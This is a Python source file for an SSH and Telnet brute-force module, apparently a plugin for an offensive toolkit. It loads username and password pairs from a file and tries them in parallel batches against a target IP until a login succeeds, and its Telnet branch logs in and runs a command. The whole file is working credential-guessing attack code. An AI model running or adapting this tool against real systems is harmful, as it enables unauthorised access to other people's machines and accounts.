

from pssh.clients.ssh import ParallelSSHClient
from pssh.config import HostConfig
from pssh.exceptions import *

import os
import telnetlib
import getpass

class SSH_TELNET_BRUTEFORCE:

    def name(self):
        return 'SSH_TELNET_BRUTEFORCE'

    def selected(self, localhost, target):
        self.localhost = localhost
        self.target = target

        self.connection_amt = 5

        self.proto_type = None
    
        while self.proto_type == None:
            out = input('SSH or Telent? (s/t): ')
            if out == 'ssh' or out == 's' or out == '':
                self.proto_type = 'SSH'
            elif out == 'telnet' or out == 't':
                self.proto_type = 'TELNET'
            else:
                print('[!] Invalid Input. Select SSH or Telnet.') 
        
        self.cred_file = None
        
        while self.cred_file == None:
            out = input('Enter path to Credentials File: ')
            if os.path.exists(out):
                self.cred_file = out   
            else:
                print('[!] Invalid path.')

        self.parse()

    def parse(self):
        self.creds = [] 

        with open(self.cred_file, 'r') as f:
            data = f.readlines()

        for line in data:
            cred = line.strip().split()
            if len(cred) == 2:
                self.creds.append(cred)
        
        self.creds_size = len(self.creds)
        
    def testParse(self,txtfile):
        self.users = []
        self.passes = []
        with open(txtfile,'r') as f:
            data = f.read().split()
            for x in range(len(data)):
                if x % 2 == 0:
                    self.users.append(data[x])
                else:
                    self.passes.append(data[x])
        
        for x in range(len(self.users)):
           # for y in range(len(self.passes)):
            print(self.users[x],self.passes[x])       

    def attempt_connections(self, host, host_config):

        hosts = []
        for i in range(self.connection_amt):
            hosts.append(host)

        conn = ParallelSSHClient(hosts, host_config=host_config)
        out = conn.run_command('exit', stop_on_errors=False)
        conn.join(out)

        return out

    def run2(self):

        host_configs = []
        for idx, cred in enumerate(self.creds):

            host_configs.append(HostConfig(user=cred[0], password=cred[1]))
    
            
            if (idx+1) % self.connection_amt == 0:
                host_outs = self.attempt_connections(self.target.ip_addr, host_configs)         
                
                for i in range(0, len(host_outs)):
                    host_out = host_outs[i]
                    host_config = host_configs[i]                   
                    conn_fail = host_out.exception
                    
                    if conn_fail == None:
                        print(f'Username: {host_config.user} Password: {host_config.password} Worked?: True')
                        return
                    else:
                        print(f'Username: {host_config.user} Password: {host_config.password} Worked?: False')
 
                host_configs = []

   
    def run(self):

        if self.proto_type == 'SSH':
            host_configs = []
            for idx, cred in enumerate(self.creds):

                host_configs.append(HostConfig(user=cred[0], password=cred[1]))
    
                if (idx+1) % self.connection_amt == 0:
                    host_outs = self.attempt_connections(self.target.ip_addr, host_configs)         
                
                    for i in range(0, len(host_outs)):
                        host_out = host_outs[i]
                        host_config = host_configs[i]                   
                        conn_fail = host_out.exception
                    
                        if conn_fail == None:
                            print(f'Username: {host_config.user} Password: {host_config.password} Worked?: True')
                            return
                        else:
                            print(f'Username: {host_config.user} Password: {host_config.password} Worked?: False')
 
                    host_configs = []

        elif self.proto_type == 'TELNET':
            targetIP = [self.target.ip_addr] # could be an array of all three ip addresses 
            user = input('Username: ')
            password = getpass.getpass(prompt='Password: ') # getpass() prompts the user for a pwd w/p echoing
            
            #for ip in targetIP:
                #try
            print("accessing device: ",targetIP[0])
            tn = telnetlib.Telnet(targetIP[0])
                #except OSError:
                    #continue
            print("cp1")
                # username
            tn.read_until(b"login: ")
            tn.write(user.encode('ascii') + b"\n")
                # password
            tn.read_until(b"password: ")
            tn.write(password.encode('ascii') + b"\n")
            print("cp2")

            tn.write(b"ls\n")
            tn.write(b"exit\n")
    
            print(tn.read_all().decode('ascii'))

